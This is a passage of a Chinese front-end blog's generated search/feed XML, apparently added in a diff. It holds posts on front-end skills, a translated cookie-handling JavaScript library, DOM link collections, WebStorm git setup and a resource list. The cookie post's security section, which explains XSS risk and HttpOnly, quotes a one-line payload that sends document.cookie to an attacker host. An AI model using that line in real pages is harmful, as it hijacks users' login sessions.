+<p><code>IE6~8</code> <code>IE9+</code> <code>Chrome</code> <code>Firefox</code> <code>Safari</code> <code>Opera</code> <code>Edge</code></p>
+<blockquote>
+<p>HTTP</p>
+</blockquote>
+<p><code>协议URI</code> <code>Cache</code> <code>Session</code> <code>Cookie</code> <code>Request</code> <code>Response</code></p>
+<blockquote>
+<p>HTML</p>
+</blockquote>
+<p><code>W3C</code> <code>HTML4.01</code> <code>HTML5</code> <code>DOM</code> <code>语义化</code></p>
+<blockquote>
+<p>CSS</p>
+</blockquote>
+<p><code>CSS1~3</code> <code>选择器</code> <code>盒模型</code> <code>Flex</code> <code>媒体检测</code> <code>响应式</code> <code>渲染引擎</code></p>
+<a id="more"></a>
+<blockquote>
+<p>JavaScript</p>
+</blockquote>
+<p><code>EcmaScript3~5~6</code> <code>Lexical-scope</code> <code>prototype-chain</code> <code>AJAX</code> <code>js引擎</code></p>
+<blockquote>
+<p>编辑器</p>
+</blockquote>
+<p><code>Emacs</code> <code>Vim</code> <code>WebStorm</code> <code>Atom</code> <code>Sublime-Text</code></p>
+<blockquote>
+<p>发布部署</p>
+</blockquote>
+<p><code>合并</code> <code>压缩</code> <code>单元测试</code> <code>Node.js</code> <code>Grunt</code> <code>Gulp</code> <code>Yeoman</code> <code>Phantom</code> <code>JSLint</code></p>
+<blockquote>
+<p>框架类库</p>
+</blockquote>
+<p><code>jQuery</code> <code>Zepto</code> <code>UnderScore</code> <code>Backbone</code> <code>Knockout</code> <code>React</code> <code>AngularJS</code> <code>Vue</code></p>
+<blockquote>
+<p>模块管理</p>
+</blockquote>
+<p><code>CommonJS</code> <code>Webpack</code></p>
+<blockquote>
+<p>UI框架</p>
+</blockquote>
+<p><code>BootStrap</code> <code>SemanticUI</code> <code>jQueryUI</code> <code>Foundation</code></p>
+<blockquote>
+<p>推送技术</p>
+</blockquote>
+<p><code>WebSocket</code> <code>轮询</code> <code>长连接</code></p>
+<blockquote>
+<p>跨域技术</p>
+</blockquote>
+<p><code>iframe</code> <code>JSONP</code> <code>CORS</code></p>
+<blockquote>
+<p>数据可视化</p>
+</blockquote>
+<p><code>D3</code> <code>Echarts</code> <code>HighCharts</code> <code>Canvas</code></p>
+<blockquote>
+<p>异步编程</p>
+</blockquote>
+<p><code>Promise</code> <code>$.Deferred</code> <code>Generator</code></p>
+<blockquote>
+<p>CSS预处理器</p>
+</blockquote>
+<p><code>LESS</code> <code>SASS</code> <code>Stylus</code></p>
+<blockquote>
+<p>客户端模板</p>
+</blockquote>
+<p><code>Handlebars</code> <code>Haml</code> <code>Jade</code> <code>Mustache</code></p>
+<blockquote>
+<p>相关语言</p>
+</blockquote>
+<p><code>CoffeeScript</code> <code>TypeScript</code> <code>Dart</code> <code>WebAssembly</code><br><code>WebApp/PCReact-native</code> <code>ionic</code></p>
+]]></content>
+      
+        <categories>
+            
+            <category> FE技术文章 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[【转】用javascript优雅的操作cookie]]></title>
+      <url>https://lostlover.github.io/20160808/dom-handle-cookie.html</url>
+      <content type="html"><![CDATA[<h4 id="像操作Storage对象一样操作cookie"><a href="#像操作Storage对象一样操作cookie" class="headerlink" title="像操作Storage对象一样操作cookie"></a>像操作Storage对象一样操作cookie</h4><blockquote>
+<p>作为一个格式化过的字符串，cookie的值有时很难被自然地处理。下面的库的目的是通过定义一个和Storage对象部分一致的对象（docCookies），简化document.cookie 的获取方法。它提供完全的Unicode支持。</p>
+</blockquote>
+<a id="more"></a>
+<h4 id="实现它"><a href="#实现它" class="headerlink" title="实现它"></a>实现它</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docCookies = &#123;</span><br><span class="line">  getItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:(?:^|.*;)\\s*"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[\-\.\+\*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\=\\s*([^;]*).*$)|^.*$"</span>), <span class="string">"$1"</span>)) || <span class="literal">null</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  setItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || <span class="regexp">/^(?:expires|max\-age|path|domain|secure)$/i</span>.test(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="keyword">var</span> sExpires = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (vEnd) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (vEnd.constructor) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Number</span>:</span><br><span class="line">          sExpires = vEnd === <span class="literal">Infinity</span> ? <span class="string">"; expires=Fri, 31 Dec 9999 23:59:59 GMT"</span> : <span class="string">"; max-age="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">String</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Date</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd.toUTCString();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(sValue) + sExpires + (sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + (sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>) + (bSecure ? <span class="string">"; secure"</span> : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || !<span class="keyword">this</span>.hasItem(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"=; expires=Thu, 01 Jan 1970 00:00:00 GMT"</span> + ( sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + ( sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  hasItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[\-\.\+\*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie);</span><br><span class="line">  &#125;,</span><br><span class="line">  keys: <span class="comment">/* optional method: you can safely remove it! */</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> aKeys = <span class="built_in">document</span>.cookie.replace(<span class="regexp">/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g</span>, <span class="string">""</span>).split(<span class="regexp">/\s*(?:\=[^;]*)?;\s*/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> nIdx = <span class="number">0</span>; nIdx &lt; aKeys.length; nIdx++) &#123; aKeys[nIdx] = <span class="built_in">decodeURIComponent</span>(aKeys[nIdx]); &#125;</span><br><span class="line">    <span class="keyword">return</span> aKeys;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><h5 id="1-写入cookie"><a href="#1-写入cookie" class="headerlink" title="1.写入cookie"></a>1.写入cookie</h5><blockquote>
+<p>语法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>描述</strong><br>创建或覆盖一个cookie</p>
+<p><strong>参数</strong><br><code>name (必要)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建或覆盖的cookie的名字 (string)。<br><code>value (必要)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie的值 (string)。<br><code>end (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最大年龄的秒数 (一年为31536e3， 永不过期的cookie为Infinity) ，或者过期时间的GMTString格式或Date对象; 如果没有定义则会在会话结束时过期 (number – 有限的或 Infinity – string, Date object or null)。<br><code>path (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如 ‘/‘, ‘/mydir’。 如果没有定义，默认为当前文档位置的路径。(string or null)。路径必须为绝对路径（参见 RFC 2965）。关于如何在这个参数使用相对路径的方法请参见这段。<br><code>domain (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如 ‘example.com’， ‘.example.com’ (包括所有子域名), ‘subdomain.example.com’。如果没有定义，默认为当前文档位置的路径的域名部分 (string或null)。<br><code>secure (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie只会被https传输 (boolean或null)。</p>
+<h5 id="2-获取cookie"><a href="#2-获取cookie" class="headerlink" title="2.获取cookie"></a>2.获取cookie</h5><blockquote>
+<p>语法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.getItem(name)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>描述</strong><br>读取一个cookie。如果cookie不存在返回null。</p>
+<p><strong>参数</strong><br><code>name</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读取的cookie名 (string).</p>
+<h5 id="3-移除cookie"><a href="#3-移除cookie" class="headerlink" title="3.移除cookie"></a>3.移除cookie</h5><blockquote>
+<p>语法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.removeItem(name[, path],domain)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>描述</strong><br>删除一个cookie。</p>
+<p><strong>参数</strong><br><code>name</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要移除的cookie名(string).<br><code>path (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如 ‘/‘, ‘/mydir’。 如果没有定义，默认为当前文档位置的路径。(string or null)。路径必须为绝对路径（参见 RFC 2965）。关于如何在这个参数使用相对路径的方法请参见这段。<br><code>domain (可选)</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如 ‘example.com’， ‘.example.com’ (包括所有子域名), ‘subdomain.example.com’。如果没有定义，默认为当前文档位置的路径的域名部分 (string或null)。</p>
+<h5 id="4-检测cookie"><a href="#4-检测cookie" class="headerlink" title="4.检测cookie"></a>4.检测cookie</h5><blockquote>
+<p>语法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.hasItem(name)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>描述</strong><br>检查一个cookie是否存在</p>
+<p><strong>参数</strong><br><code>name</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要检查的cookie名 (string).</p>
+<h5 id="5-得到所有cookie的列表"><a href="#5-得到所有cookie的列表" class="headerlink" title="5.得到所有cookie的列表"></a>5.得到所有cookie的列表</h5><blockquote>
+<p>语法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.keys()</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>描述</strong><br>返回一个这个路径所有可读的cookie的数组。</p>
+<h4 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法:"></a>示例用法:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">docCookies.setItem(<span class="string">"test0"</span>, <span class="string">"Hello world!"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test1"</span>, <span class="string">"Unicode test: \u00E0\u00E8\u00EC\u00F2\u00F9"</span>, <span class="literal">Infinity</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test2"</span>, <span class="string">"Hello world!"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2020</span>, <span class="number">5</span>, <span class="number">12</span>));</span><br><span class="line">docCookies.setItem(<span class="string">"test3"</span>, <span class="string">"Hello world!"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2027</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="string">"/blog"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test4"</span>, <span class="string">"Hello world!"</span>, <span class="string">"Sun, 06 Nov 2022 21:43:15 GMT"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test5"</span>, <span class="string">"Hello world!"</span>, <span class="string">"Tue, 06 Dec 2022 13:11:07 GMT"</span>, <span class="string">"/home"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test6"</span>, <span class="string">"Hello world!"</span>, <span class="number">150</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test7"</span>, <span class="string">"Hello world!"</span>, <span class="number">245</span>, <span class="string">"/content"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test8"</span>, <span class="string">"Hello world!"</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"example.com"</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test9"</span>, <span class="string">"Hello world!"</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">docCookies.setItem(<span class="string">"test1;="</span>, <span class="string">"Safe character test;="</span>, <span class="literal">Infinity</span>);</span><br><span class="line"> </span><br><span class="line">alert(docCookies.keys().join(<span class="string">"\n"</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">"test1"</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">"test5"</span>));</span><br><span class="line">docCookies.removeItem(<span class="string">"test1"</span>);</span><br><span class="line">docCookies.removeItem(<span class="string">"test5"</span>, <span class="string">"/home"</span>);</span><br><span class="line">alert(docCookies.getItem(<span class="string">"test1"</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">"test5"</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">"unexistingCookie"</span>));</span><br><span class="line">alert(docCookies.getItem());</span><br><span class="line">alert(docCookies.getItem(<span class="string">"test1;="</span>));</span><br></pre></td></tr></table></figure>
+<h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><blockquote>
+<p>路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的<code>iframe</code>, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用<code>同源策略</code>保护其不被读取.</p>
+</blockquote>
+<blockquote>
+<p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 <a href="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/" target="_blank" rel="noopener">Cookies and Security</a>.</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">原文链接</a></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> DOM </tag>
+            
+            <tag> cookie </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[document.anchors,document.links,document.getElementsByTagName("a")的区别]]></title>
+      <url>https://lostlover.github.io/20160808/dom-anchors-links-a.html</url>
+      <content type="html"><![CDATA[<p>document.anchors返回得到的数组是所有具有name属性的a标签集合<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>document.links返回得到的数组是所有具有href属性的a标签和area标签集合<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com target="</span><span class="attr">_blank</span>"&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>document.getElementsByTagName(“a”)返回得到的数组是所有a标签<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"anchor"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"anchor"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> DOM </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Webstorm玩转git（1）-安装git客户端]]></title>
+      <url>https://lostlover.github.io/20160803/webstorm-git.html</url>
+      <content type="html"><![CDATA[<blockquote>
+<p>环境：win10</p>
+</blockquote>
+<p><img src="https://git-scm.com/images/logo@2x.png" alt="git"> </p>
+<blockquote>
+<p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载地址</a><br>有可能出现被墙的情况<br>一路next安装成功即可</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="设置git环境变量"><a href="#设置git环境变量" class="headerlink" title="设置git环境变量"></a>设置git环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//在path变量中增加</span><br><span class="line">C:\Program Files\Git\cmd</span><br><span class="line">C:\Program Files\Git\bin</span><br><span class="line">C:\Program Files\Git\libexec\git-core</span><br></pre></td></tr></table></figure>
+<h3 id="webstorm下设置git客户端并测试"><a href="#webstorm下设置git客户端并测试" class="headerlink" title="webstorm下设置git客户端并测试"></a>webstorm下设置git客户端并测试</h3><blockquote>
+<ul>
+<li>打开Settings-&gt; Version Control-&gt; Git<br><img src="/downloads/git-setting1.png" alt="git设置"></li>
+<li>点击Test 弹出success提示就成功了</li>
+</ul>
+</blockquote>
+<hr>
+<p>因为笔者的项目都托管在github上,为了方便直接与github账号关联。</p>
+<h3 id="关联github账号"><a href="#关联github账号" class="headerlink" title="关联github账号"></a>关联github账号</h3><blockquote>
+<ul>
+<li>打开Settings-&gt; Version Control-&gt; Github<br><img src="/downloads/git-setting2.png" alt="github设置"></li>
+<li>填写github的账号密码</li>
+<li>点击test 弹出success就关联成功了</li>
+</ul>
+</blockquote>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> git </tag>
+            
+            <tag> webstorm </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[前端资源(优秀网站、博客、以及活跃开发者)]]></title>
+      <url>https://lostlover.github.io/20160801/front-end-resource-collection.html</url>
+      <content type="html"><![CDATA[<p>@forked from <a href="https://github.com/hjzheng/front-end-collect/?_blank" target="_blank" rel="noopener">hjzheng/front-end-collect</a></p>
+<p>在前端路上摸索前行，在这里分享自己长期关注的前端开发相关的优秀网站、博客、以及活跃开发者。欢迎更新。以下各排名不分先后顺序。</p>
+<h4 id="前端收集图谱-点击查看"><a href="#前端收集图谱-点击查看" class="headerlink" title="前端收集图谱(点击查看)"></a><a href="http://lostlover.github.io/front-end-collect/?_blank">前端收集图谱(点击查看)</a></h4><p><img src="https://raw.githubusercontent.com/hjzheng/front-end-collect/master/img/front-end-chart.png" alt="image"></p>
+<a id="more"></a>
+<h4 id="聚合-amp-amp-周报订阅"><a href="#聚合-amp-amp-周报订阅" class="headerlink" title="聚合&amp;&amp;周报订阅"></a>聚合&amp;&amp;周报订阅</h4><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>订阅地址</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Html5 Weekly</td>
+<td><a href="http://html5weekly.com/" target="_blank" rel="noopener">http://html5weekly.com/</a></td>
+<td>Html 技术类</td>
+</tr>
+<tr>
+<td>CSS Weekly</td>
+<td><a href="http://css-weekly.com/" target="_blank" rel="noopener">http://css-weekly.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Javascript Weekly</td>
+<td><a href="http://javascriptweekly.com/" target="_blank" rel="noopener">http://javascriptweekly.com/</a></td>
+<td>JS相关，同样有 html,css 和工具相关</td>
+</tr>
+<tr>
+<td>Web Design Weekly</td>
+<td><a href="http://web-design-weekly.com/" target="_blank" rel="noopener">http://web-design-weekly.com/</a></td>
+<td>设计、技术、技巧、工具聚合</td>
+</tr>
+<tr>
+<td>UX Weekly</td>
+<td><a href="http://uxwkly.com/" target="_blank" rel="noopener">http://uxwkly.com/</a></td>
+<td>用户体验、网页设计推送</td>
+</tr>
+<tr>
+<td>Web Tools Weekly</td>
+<td><a href="http://webtoolsweekly.com/" target="_blank" rel="noopener">http://webtoolsweekly.com/</a></td>
+<td>Js，工具推送</td>
+</tr>
+<tr>
+<td>RESPONSIVE DESIGN NEWSLETTER</td>
+<td><a href="http://responsivedesignweekly.com/" target="_blank" rel="noopener">http://responsivedesignweekly.com/</a></td>
+<td>每周推送一次响应式设计相关</td>
+</tr>
+<tr>
+<td>Tutorialzine</td>
+<td><a href="http://tutorialzine.com/" target="_blank" rel="noopener">http://tutorialzine.com/</a></td>
+<td>精品教程和资源推送</td>
+</tr>
+<tr>
+<td>Sidebar</td>
+<td><a href="http://sidebar.io/" target="_blank" rel="noopener">http://sidebar.io/</a></td>
+<td>每天、每半周、每周推送5条设计相关</td>
+</tr>
+<tr>
+<td>The Hacker News Newsletter</td>
+<td><a href="http://www.hackernewsletter.com/" target="_blank" rel="noopener">http://www.hackernewsletter.com/</a></td>
+<td>HN 每周精选</td>
+</tr>
+<tr>
+<td>Design News</td>
+<td><a href="https://news.layervault.com/" target="_blank" rel="noopener">https://news.layervault.com/</a></td>
+<td>F2类资讯聚合</td>
+</tr>
+<tr>
+<td>HACKDESIGN</td>
+<td><a href="http://hackdesign.org/" target="_blank" rel="noopener">http://hackdesign.org/</a></td>
+<td>每周发布一个设计类课程</td>
+</tr>
+</tbody>
+</table>
+<h4 id="专业博客"><a href="#专业博客" class="headerlink" title="专业博客"></a>专业博客</h4><p>注:此处<code>活跃度</code>为博客更新频率，<code>原创度</code>指的是作者原创或者翻译的文章所占博文比例。请尊重原创，大量转载其他网站资讯的网站和聚合类网站不做推荐。</p>
+<h6 id="中文博客"><a href="#中文博客" class="headerlink" title="中文博客"></a>中文博客</h6><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>活跃度</th>
+<th>原创度</th>
+<th>维护者</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.w3cplus.com/" target="_blank" rel="noopener">W3Cplus</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>携程 @大漠</td>
+<td>国内最优秀的前端博客，原创居多</td>
+</tr>
+<tr>
+<td><a href="http://www.qianduan.net/" target="_blank" rel="noopener">前端观察</a></td>
+<td>★★★★☆</td>
+<td>★★★★☆</td>
+<td>腾讯 ISUX @神飞</td>
+<td>曾经最优秀，最近更新不频繁了</td>
+</tr>
+<tr>
+<td><a href="http://www.alloyteam.com/" target="_blank" rel="noopener">腾讯web前端 AlloyTeam 团队</a></td>
+<td>★★★★</td>
+<td>★★★★</td>
+<td><a href="http://t.qq.com/AlloyTeam" target="_blank" rel="noopener">@腾讯AlloyTeam</a></td>
+<td>来自于腾讯SNG(社交网络事业群)</td>
+</tr>
+<tr>
+<td><a href="http://www.zhangxinxu.com/wordpress/" target="_blank" rel="noopener">张鑫旭-鑫空间-鑫生活</a></td>
+<td>★★★★☆</td>
+<td>★★★★★</td>
+<td>张鑫旭</td>
+<td>重构很厉害，不少经典文章经验</td>
+</tr>
+<tr>
+<td><a href="http://www.36ria.com/" target="_blank" rel="noopener">ria之家</a></td>
+<td>★★★★☆</td>
+<td>★★★★☆</td>
+<td>淘宝 @明河</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://www.daqianduan.com/" target="_blank" rel="noopener">大前端</a></td>
+<td>★★★★☆</td>
+<td>★★★★☆</td>
+<td><a href="http://www.cssforest.org/blog/index.php?s=about" target="_blank" rel="noopener">#</a></td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://www.cssforest.org/blog/" target="_blank" rel="noopener">CSS森林</a></td>
+<td>★★★★☆</td>
+<td>★★★★☆</td>
+<td><a href="http://www.cssforest.org/blog/index.php?s=about" target="_blank" rel="noopener">关于</a></td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://www.shejidaren.com/" target="_blank" rel="noopener">设计达人</a></td>
+<td>★★★★☆</td>
+<td>★★★☆☆</td>
+<td><a href="http://www.cssforest.org/blog/index.php?s=about" target="_blank" rel="noopener">#</a></td>
+<td>更新较频繁，但转载也较多</td>
+</tr>
+<tr>
+<td><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">阮一峰博客</a></td>
+<td>★★★★☆</td>
+<td>★★★☆☆</td>
+<td><a href="http://www.ruanyifeng.com/about.html" target="_blank" rel="noopener">#</a></td>
+<td>牛人一个</td>
+</tr>
+<tr>
+<td><a href="http://beforweb.com/" target="_blank" rel="noopener">Be For Web - 为网而生 - 原创译文博客</a></td>
+<td>★★★★☆</td>
+<td>★★★★☆</td>
+<td><a href="http://weibo.com/c7210" target="_blank" rel="noopener">@C7210</a></td>
+<td>关注移动应用及互联网产品、用户体验设计、前端开发</td>
+</tr>
+</tbody>
+</table>
+<h6 id="国外博客"><a href="#国外博客" class="headerlink" title="国外博客"></a>国外博客</h6><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>活跃度</th>
+<th>原创度</th>
+<th>维护者</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.smashingmagazine.com/" target="_blank" rel="noopener">Smashing Magazine</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>业界权威，web 设计很赞</td>
